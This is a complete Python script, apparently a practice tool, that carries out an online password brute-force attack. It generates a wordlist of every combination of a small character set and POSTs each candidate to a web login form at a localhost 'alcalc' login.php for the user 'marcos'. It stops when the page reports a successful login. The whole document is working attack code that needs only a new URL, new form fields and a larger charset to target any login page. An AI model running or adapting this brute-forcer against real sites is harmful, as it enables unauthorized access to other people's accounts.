import requests, itertools

#Configuration parameters
formuser = 'user'
formpass = 'password'
user = 'marcos'
filename = 'senhas.txt'
url = 'http://localhost/alcalc/login.php'
wordlistchars = 'abcd1234'
wordlistsize = 4
#0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.

def gotRight(r):
    #Configure success condition
    if 'login deu certo' in r.text: return 1
    return 0

def test(password):
    data = {formuser: user, formpass: password}
    r = requests.post(url, data)
    if gotRight(r): return 1
    return 0

def calc(x, n):
    if n == 1: return x
    value = x
    for y in range(n - 1): x = x * value
    return x + calc(value, n - 1)

def generateWordlist():
    f = open(filename, 'w')
    f.close()
    f = open(filename, 'a')
    for y in range(wordlistsize):
        for index,x in enumerate(itertools.product(wordlistchars, repeat = wordlistsize - y)): 
            f.write(''.join(x) + '\n')
            print(f'Generated password {index + 1}/{calc(len(wordlistchars), wordlistsize)}')
    f.close()

print('Generating wordlist..')
generateWordlist()

found = False
f = open(filename)
lines = f.readlines()
f.close()
print('Loading password file..')
for index, line in enumerate(lines):
    lines[index] = lines[index].replace('\n', '')
for index,x in enumerate(lines):
    print(f'Testing password {index + 1}/{len(lines)}: {x}')
    if test(x):
        found = True
        print(f'PASSWORD FOUND: {x}')
        break
if found == False: print('COULD NOT FIND PASSWORD')
